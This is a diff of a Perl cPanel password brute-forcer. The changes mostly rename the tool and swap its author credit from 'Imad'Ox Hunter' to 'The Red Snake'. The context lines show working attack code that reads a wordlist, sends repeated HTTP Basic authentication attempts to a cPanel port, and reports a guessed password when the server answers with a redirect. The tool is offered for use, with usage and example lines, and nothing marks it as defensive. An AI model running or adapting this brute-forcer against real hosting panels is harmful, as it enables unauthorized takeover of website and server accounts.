@@ -1,7 +1,7 @@
 #!/usr/bin/perl 
-# Cpanel Password Brute Forcer 
+# Cpanel Brute Forcer 
 # ---------------------------- 
-#    Coded By Imad'Ox Hunter
+# Coded By The Red Snake
 
 use IO::Socket; 
 use LWP::Simple; 
@@ -15,7 +15,7 @@ $file     = $ARGV[4];
 $url = "http://".$host.":".$port; 
 if(@ARGV < 3){ 
 print q( 
-*:*:*:*:*:*: Cpanel Password Brute Forcer :*:*:*:*:*:*:*:*:*:*
+*:*:*:*:*:*: Cpanel Brute Forcer :*:*:*:*:*:*:*:*:*:*
  
 --+ Usage   : cpanel.pl [HOST] [User] [PORT][Wordlist] [Save Wordlist] +--
 --+ Example : cpanel.pl localhost admin 2082 Wordlist.lst cracked.txt  +--
@@ -25,7 +25,7 @@ USER 	      => USERNAME
 PORT          => THE CPANEL PORT
 LIST          => WORDLITS FILE
 SAVE WORDLIST => FILE TO SAVE THE WORDLIST
-*:*:*:*:*:*:   Coded By Imad'Ox Hunter   :*:*:*:*:*:*:*:*:*:*
+*:*:*:*:*:*:   Coded By The Red Snake   :*:*:*:*:*:*:*:*:*:*
 );exit;} 
  
 headx(); 
@@ -36,7 +36,7 @@ sub headx() {
 print q( 
  
 +:+:+:+:+:+:+:+:+:+: Cpanel Password Brute Force Tool :+:+:+:+:+:
-:+:+:+:+:+:+:+:+:+         Coded By Imad'Ox Hunter    +:+:+:+:+:+ 
+:+:+:+:+:+:+:+:+:+ Coded By The Red Snake +:+:+:+:+:+ 
  
 ); 
 open (PASSFILE, "<$list") || die "[-] Wordlist Not Found !"; 
@@ -60,7 +60,7 @@ print $sock "GET / HTTP/1.1
 "; 
 print $sock "Authorization: Basic $authx 
 "; 
-print $sock "Connection: Close 
+print $sock "Connection: Close
  
 "; 
 read  $sock, $answer, 128; 
@@ -68,7 +68,7 @@ close($sock);
  
 if ($answer =~ /Moved/) { 
 print " 
-[~] PASSWORD FOUND :D : $passwd 
+[~] PASSWORD FOUND: $passwd 
 "; 
 exit(); 
 } 
